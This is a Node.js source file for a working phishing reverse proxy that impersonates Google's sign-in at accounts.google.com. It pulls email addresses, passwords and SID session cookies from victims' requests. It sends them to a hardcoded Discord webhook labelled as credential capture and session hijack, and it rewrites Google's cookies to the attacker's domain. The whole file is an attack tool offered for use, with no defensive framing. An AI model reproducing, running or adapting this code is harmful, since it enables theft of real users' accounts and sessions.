const express = require('express');
const http = require('http');
const { fetch } = require('undici');
const cookieParser = require('cookie-parser');
const rawBody = require('raw-body');

const app = express();

// --- GLOBAL ERROR HANDLERS ---
process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

// --- MIDDLEWARE ---
app.use(cookieParser({ decode: (val) => val }));

// --- CONFIGURATION ---
// REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1562347397328408668/77sTEQZglTHZUB-iP_oU1nkqftlqKVqpIKxkAirPQ5tNAPd-u-uSDNCapWpAAfgyBp7D';
const TARGET_HOST = 'accounts.google.com';

// --- DISCORD NOTIFIER ---
async function sendToDiscord(title, fields, color = 0x00ff00) {
  if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK_ID')) {
    console.log('[DISCORD] Webhook not configured. Skipping alert.');
    return;
  }

  const payload = {
    content: `**🚨 ${title}**`,
    embeds: [{
      title: title,
      fields: fields.map(f => ({ name: f.name, value: f.value, inline: f.inline || false })),
      color: color,
      timestamp: new Date().toISOString()
    }]
  };

  try {
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!response.ok) {
      console.error(`[DISCORD] Webhook failed with status: ${response.status}`);
    }
  } catch (err) {
    console.error('[DISCORD] Webhook error:', err.message);
  }
}

// --- COOKIE REWRITER ---
function rewriteCookies(cookies, localDomain) {
  if (!cookies) return [];
  const cookieArray = Array.isArray(cookies) ? cookies : [cookies];
  return cookieArray.map(cookie => {
    if (/domain=/i.test(cookie)) {
      return cookie.replace(/domain=[^;]+/i, `Domain=${localDomain}`);
    } else {
      return `${cookie}; Domain=${localDomain}`;
    }
  });
}

// --- HEALTH CHECK ---
app.get('/health', (req, res) => {
  console.log('[HEALTH] Health check received.');
  res.status(200).send('OK');
});

// --- RAW BODY CATCHER & ANALYZER ---
app.use((req, res, next) => {
  if (['GET', 'HEAD', 'DELETE'].includes(req.method)) {
    return next();
  }

  rawBody(req, {
    length: req.headers['content-length'],
    limit: '10mb',
    encoding: 'buffer'
  }).then((buffer) => {
    req.rawBody = buffer;
    const rawBodyStr = buffer.toString('utf8');
    
    console.log(`[RAW] ${req.method} ${req.originalUrl} - Body Length: ${rawBodyStr.length}`);

    // --- CREDENTIAL EXTRACTION ---
    // We use a "Fuzzy" search. We look for JSON keys or URL parameters that contain 'email' or 'pass'.
    let email = null;
    let password = null;

    // 1. Try to parse as JSON first
    try {
      const json = JSON.parse(rawBodyStr);
      // Recursively search the JSON object for keys
      const searchJson = (obj) => {
        if (typeof obj !== 'object' || obj === null) return;
        for (const key in obj) {
          const lowerKey = key.toLowerCase();
          const value = obj[key];
          if (typeof value === 'string') {
            if (lowerKey.includes('email') || lowerKey.includes('identifier') || lowerKey.includes('phone')) {
              email = value;
            } else if (lowerKey.includes('pass') || lowerKey.includes('pwd') || lowerKey.includes('credential')) {
              password = value;
            }
          } else if (typeof value === 'object') {
            searchJson(value);
          }
        }
      };
      searchJson(json);
    } catch (e) {
      // Not JSON, try URL-encoded
      const params = new URLSearchParams(rawBodyStr);
      for (const [key, value] of params.entries()) {
        const lowerKey = key.toLowerCase();
        if (lowerKey.includes('email') || lowerKey.includes('identifier') || lowerKey.includes('phone')) {
          email = value;
        } else if (lowerKey.includes('pass') || lowerKey.includes('pwd') || lowerKey.includes('credential')) {
          password = value;
        }
      }
    }

    // 2. If we found credentials, send them
    if (email && password) {
      console.log(`[CREDENTIALS] CAPTURED: ${email} : ${password}`);
      sendToDiscord('🔓 CREDENTIAL CAPTURE', [
        { name: 'Email', value: email, inline: true },
        { name: 'Password', value: password, inline: true },
        { name: 'Path', value: req.originalUrl, inline: false },
        { name: 'User-Agent', value: req.headers['user-agent'] || 'Unknown', inline: false }
      ], 0x00ff00);
    } else if (email) {
      console.log(`[EMAIL] CAPTURED: ${email}`);
      sendToDiscord('📧 EMAIL CAPTURE (Step 1)', [
        { name: 'Email', value: email, inline: true },
        { name: 'Path', value: req.originalUrl, inline: false }
      ], 0x00aaff);
    }

    // 3. Session Hijack Check
    if (req.headers.cookie) {
      const cookies = req.headers.cookie;
      const sidMatch = cookies.match(/SID=([^;]+)/);
      if (sidMatch) {
        const sid = sidMatch[1];
        console.log(`[SESSION] HIJACK: SID=${sid.substring(0, 10)}...`);
        sendToDiscord('🛡️ SESSION HIJACK', [
          { name: 'SID', value: sid, inline: false },
          { name: 'IP', value: req.headers['x-forwarded-for'] || req.socket.remoteAddress, inline: false }
        ], 0xff0000);
      }
    }

    next();
  }).catch((err) => {
    console.error(`[RAW BODY ERROR] ${err.message}`);
    res.status(500).send('Error buffering request body');
  });
});

// --- THE CATCH-ALL ROUTE (Pure HTTP Proxy) ---
app.all('*', (req, res) => {
  // Determine the target URL
  const targetUrl = `${TARGET_HOST}${req.originalUrl}`;
  
  // Prepare headers for the outgoing request
  const forwardHeaders = {
    ...req.headers,
    'Host': TARGET_HOST, // Crucial: Must be accounts.google.com
    'Origin': `https://${TARGET_HOST}`, // Crucial: Must match target
    'Referer': `https://${TARGET_HOST}/signin/` // Crucial: Must look like a Google page
  };

  // Remove hop-by-hop headers
  delete forwardHeaders['connection'];
  delete forwardHeaders['keep-alive'];

  // If we have a raw body, use it. Otherwise, use undefined (for GET requests)
  const body = req.rawBody ? req.rawBody : undefined;

  console.log(`[PROXY] Forwarding ${req.method} to ${targetUrl}`);

  fetch(targetUrl, {
    method: req.method,
    headers: forwardHeaders,
    body: body,
    redirect: 'follow' // Follow redirects internally
  }).then(async (response) => {
    // Read the response as a buffer
    const data = await response.arrayBuffer();
    
    // Send the response back to the client
    res.status(response.status);
    
    // Forward headers, excluding hop-by-hop and set-cookie
    response.headers.forEach((value, key) => {
      const lowerKey = key.toLowerCase();
      if (lowerKey !== 'set-cookie' && lowerKey !== 'content-encoding' && lowerKey !== 'content-length' && lowerKey !== 'transfer-encoding' && lowerKey !== 'connection') {
        res.setHeader(key, value);
      }
    });

    // Rewrite Cookies
    const setCookieHeaders = response.headers.getSetCookie ? response.headers.getSetCookie() : [response.headers.get('set-cookie')].filter(Boolean);
    if (setCookieHeaders && setCookieHeaders.length > 0) {
      // Get the local domain from the request
      const localDomain = req.headers['host'].split(':')[0];
      res.setHeader('Set-Cookie', rewriteCookies(setCookieHeaders, localDomain));
    }

    // Send the body
    res.send(Buffer.from(data));
  }).catch(err => {
    console.error(`[PROXY ERROR] ${err.message}`);
    res.status(500).send('Proxy Error: ' + err.message);
  });
});

const server = http.createServer(app);
server.listen(3000, () => console.log('Phishing Proxy running on http://localhost:3000'));
